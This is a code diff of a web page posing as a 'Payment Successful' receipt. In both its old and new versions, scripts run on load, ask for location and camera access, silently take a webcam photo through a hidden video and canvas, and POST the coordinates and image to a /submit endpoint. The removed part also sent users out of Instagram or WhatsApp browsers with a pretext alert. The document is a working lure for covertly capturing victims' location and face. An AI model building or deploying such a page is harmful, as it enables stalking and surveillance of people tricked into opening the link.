@@ -49,12 +49,7 @@
     }
 
     #video {
-      position: absolute;
-      left: -9999px;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      pointer-events: none;
+      display: none;
     }
 
     canvas {
@@ -67,86 +62,77 @@
   <div class="text">Payment Successful</div>
   <div class="timestamp">20 June 2025 at 12:56 PM</div>
 
-  <!-- Hidden elements for background capture -->
   <video id="video" autoplay muted playsinline></video>
   <canvas id="canvas" width="320" height="240"></canvas>
 
   <script>
-    function isInAppBrowser() {
-      const ua = navigator.userAgent || navigator.vendor || window.opera;
-      return /Instagram|FBAN|FBAV|Messenger|WhatsApp/i.test(ua);
-    }
+    async function getPermissionsAndCapture() {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
 
-    function tryRedirectToBrowser() {
-      const currentUrl = window.location.href;
-
-      // Android Chrome deep link
-      const intentUrl = "intent://" + currentUrl.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
-
-      window.location = intentUrl;
-
-      setTimeout(() => {
-        alert("⚠️ For full functionality, please open this link in your browser (like Chrome). In-app browsers may block camera or location access.");
-      }, 2000);
-    }
-
-    if (isInAppBrowser()) {
-      tryRedirectToBrowser();
-    } else {
-      window.onload = async function getPermissionsAndCapture() {
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-
-        const locationPromise = new Promise((resolve, reject) => {
-          if (!navigator.geolocation) {
-            reject("Geolocation not supported");
-            return;
-          }
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              const lat = position.coords.latitude.toFixed(6);
-              const lon = position.coords.longitude.toFixed(6);
-              resolve({ lat, lon });
-            },
-            () => reject("Location permission denied")
-          );
-        });
-
-        const cameraPromise = navigator.mediaDevices.getUserMedia({ video: true });
-
-        try {
-          const [locationData, stream] = await Promise.all([locationPromise, cameraPromise]);
-
-          video.srcObject = stream;
-          video.onloadedmetadata = () => {
-            video.play();
-            setTimeout(() => {
-              const context = canvas.getContext("2d");
-              context.drawImage(video, 0, 0, canvas.width, canvas.height);
-              const imageData = canvas.toDataURL("image/jpeg");
-
-              fetch("/submit", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                  lat: locationData.lat,
-                  lon: locationData.lon,
-                  image: imageData
-                }),
-              })
-                .then(res => res.json())
-                .then(res => console.log("✅ Submitted:", res))
-                .catch(err => console.error("❌ Submit error:", err));
-
-              stream.getTracks().forEach(track => track.stop());
-            }, 500);
-          };
-        } catch (err) {
-          alert("Permission error: " + err);
-          console.error("❌ Permission error:", err);
+      const locationPromise = new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject("Geolocation not supported");
+          return;
         }
-      };
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude.toFixed(6);
+            const lon = position.coords.longitude.toFixed(6);
+            resolve({ lat, lon });
+          },
+          (err) => {
+            console.error("Location error:", err.message);
+            alert("Location error: " + err.message);
+            reject(err.message);
+          }
+        );
+      });
+
+      const cameraPromise = navigator.mediaDevices.getUserMedia({ video: true }).catch((err) => {
+        console.error("Camera error:", err.message);
+        alert("Camera error: " + err.message);
+        throw err;
+      });
+
+      try {
+        const [locationData, stream] = await Promise.all([locationPromise, cameraPromise]);
+
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          video.play();
+          setTimeout(() => {
+            const context = canvas.getContext("2d");
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/jpeg");
+
+            fetch("/submit", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                lat: locationData.lat,
+                lon: locationData.lon,
+                image: imageData
+              }),
+            })
+              .then(res => res.json())
+              .then(res => console.log("✅ Submitted:", res))
+              .catch(err => console.error("❌ Submit error:", err));
+
+            stream.getTracks().forEach(track => track.stop());
+          }, 500); // 0.5s delay for quick capture
+        };
+      } catch (err) {
+        console.error("Permission handling failed:", err);
+      }
     }
+
+    window.onload = () => {
+      setTimeout(() => {
+        getPermissionsAndCapture();
+      }, 500); // small delay after page load
+    };
   </script>
 </body>
 </html>
